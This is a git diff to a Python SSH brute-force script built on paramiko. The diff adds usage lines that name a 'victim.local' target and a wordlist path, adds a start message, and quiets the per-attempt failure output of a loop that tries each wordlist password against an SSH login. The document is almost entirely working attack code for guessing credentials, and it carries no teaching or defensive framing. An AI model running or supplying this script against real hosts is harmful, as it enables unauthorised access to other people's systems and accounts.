@@ -4,10 +4,17 @@ import paramiko
 import sys
 import os
 
+print("USE - ./ssh_bruteforce.py [HOSTNAME/IP] [PORT] [USERNAME] [WORDLIST-PATH]")
+print("EX - ./ssh_bruteforce.py victim.local 2222 user /usr/share/wordlist.txt")
+print("")
+
 target = sys.argv[1]
 port = sys.argv[2]
 username = sys.argv[3]
 password_file = sys.argv[4]
+
+print("")
+print("[+] Starting Process...")
 
 def ssh_connect(password, code=0):
     ssh = paramiko.SSHClient()
@@ -30,8 +37,8 @@ with open(password_file, 'r', encoding='latin-1') as file:
             if response == 0:
                  print('Password found: '+ password)
                  exit(0)
-            elif response == 1: 
-                print('No password found!')
+            elif response == 1:
+                pass
         except Exception as e:
             print(e)
         pass
